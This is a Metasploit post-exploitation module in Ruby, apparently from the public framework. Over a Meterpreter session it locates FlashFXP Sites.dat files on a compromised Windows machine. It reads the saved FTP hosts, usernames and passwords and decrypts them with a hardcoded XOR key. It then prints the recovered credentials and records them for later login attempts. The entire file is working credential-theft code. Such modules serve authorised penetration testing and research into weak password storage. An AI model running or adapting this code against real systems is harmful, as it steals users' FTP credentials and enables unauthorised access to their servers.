##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather FlashFXP Saved Password Extraction',
        'Description' => %q{
          This module extracts weakly encrypted saved FTP Passwords from FlashFXP. It
          finds saved FTP connections in the Sites.dat file.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'theLightCosine'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_eof
              core_channel_open
              core_channel_read
              core_channel_write
            ]
          }
        }
      )
    )
  end

  def run
    # Checks if the Site data is stored in a generic location  for all users
    flash_reg = 'HKLM\\SOFTWARE\\FlashFXP'
    flash_reg_ver = registry_enumkeys(flash_reg.to_s)

    # Ini paths
    @fxppaths = []

    unless flash_reg_ver.nil?
      software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
      generic_path = registry_getvaldata(software_key, 'InstallerDataPath') || ''
      unless generic_path.include? '%APPDATA%'
        @fxppaths << generic_path + '\\Sites.dat'
      end
    end

    grab_user_profiles.each do |user|
      next if user['AppData'].nil?

      tmpath = user['AppData'] + '\\FlashFXP\\'
      get_ver_dirs(tmpath)
    end

    @fxppaths.each do |fxp|
      get_ini(fxp)
    end
  end

  def get_ver_dirs(path)
    session.fs.dir.foreach(path) do |sub|
      next if sub =~ /^(\.|\.\.)$/

      @fxppaths << "#{path}#{sub}\\Sites.dat"
    end
  rescue StandardError
    print_error("The following path could not be accessed or does not exist: #{path}")
  end

  def get_ini(filename)
    config = client.fs.file.new(filename, 'r')
    parse = config.read
    ini = Rex::Parser::Ini.from_s(parse)

    if ini == {}
      print_error("Unable to parse file, may be encrypted using external password: #{filename}")
    end

    ini.each_key do |group|
      host = ini[group]['IP']
      username = ini[group]['user']
      epass = ini[group]['pass']
      port = ini[group]['port']
      next if epass.nil? || (epass == '')

      passwd = decrypt(epass)

      print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
      service_data = {
        address: Rex::Socket.getaddress(host),
        port: port,
        protocol: 'tcp',
        service_name: 'ftp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        username: username,
        private_data: passwd,
        private_type: :password
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        access_level: 'User',
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
  rescue StandardError
    print_status("Either could not find or could not open file #{filename}")
  end

  def decrypt(pwd)
    key = 'yA36zA48dEhfrvghGRg57h5UlDv3'
    pass = ''
    cipher = [pwd].pack('H*')

    (0..cipher.length - 2).each do |index|
      xored = cipher[index + 1, 1].unpack('C').first ^ key[index, 1].unpack('C').first
      if ((xored - cipher[index, 1].unpack('C').first < 0))
        xored += 255
      end
      pass << (xored - cipher[index, 1].unpack('C').first).chr
    end
    return pass
  end
end
